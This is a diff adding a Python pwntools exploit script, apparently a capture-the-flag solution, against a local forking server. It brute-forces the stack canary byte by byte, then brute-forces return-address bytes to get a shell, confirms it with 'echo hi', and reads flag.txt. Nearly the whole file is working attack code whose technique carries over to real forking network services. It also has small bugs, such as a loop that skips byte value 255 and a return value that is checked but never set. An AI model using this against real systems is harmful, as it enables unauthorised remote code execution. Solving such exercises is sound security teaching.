@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+
+from time import sleep
+from pwn import *
+
+context.log_level = "error"
+
+
+# helper functions
+
+
+def start_server():
+    # you might want to remove the DEVNULL lines
+    # during the development of the exploit to see
+    # errors -> in the final solution we just want to see the flag :)
+    return subprocess.Popen(
+        ["./forkingserver"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+
+def get_connection():
+    return remote("localhost", 6666)
+
+
+def int_to_byte(i):
+    return bytes([i])
+
+
+# you can add your functions here
+
+
+def tryit():
+    # the forkingserver that accepts connections
+    length = 72 + 8 + 48 + 8 	 		# 72 to the first canary, 8 byte canary, 48 to the second copy, 8 byte canary
+    input1 = b'A' * 72 + b'\x00'			# It is known that the first byte to overwrite will be \x00
+    io = get_connection()				# connect
+    io.send(input1)				# send the forged input
+    var = io.recvall()				# read output
+    for i in range(0, 7):				# we need 7 more bytes
+        for j in range(0, 255):			# each can be one of 256 values
+            io = get_connection()			
+            input2 = input1 + j.to_bytes(1, byteorder='little')	#forge byte per byte
+            io.send(input2)
+            output = io.recvall()
+            if "stack" in str(output):				# check if stack smashed
+                continue
+            input1 = input1 + j.to_bytes(1, byteorder='little')	# if not we found the next byte
+            break
+    canary = input1[72:]						# in the end we the canary has been brute-forced
+    return canary
+    # you can uncomment this to talk to the server manually
+
+
+def test(canary, i):						# We need to brute-force the second last bytes of the address
+    for j in range(0, 255):					# 256 possible values
+        io = get_connection()					# the last byte is already given by the offset @
+        payload = b'A' * 72 + canary + b'A' * 8 + i.to_bytes(1, byteorder='little') + j.to_bytes(1, byteorder='little')
+        io.send(payload)
+        var = io.recvline()
+        try:
+            io.sendline(b'echo hi')					# send bash command
+            var = io.recvline()
+            var = io.recvline()
+            if b'hi' in var:					# if the expected response gets caught, the byte has been found
+                io.sendline(b'cat flag.txt')
+                print(str(io.recvline())[2:-3])			# Print flag
+                break
+        except:
+            pass
+
+
+def main():
+    server = start_server()					# Start server
+    canary = tryit()						# get canary
+    for i in range(64, 65):					# for given offset brute force the second last byte
+        j = test(canary, i)					# enjoy the flag
+        if j!=-1:
+            break
+
+
+if __name__ == "__main__":
+    main()
+
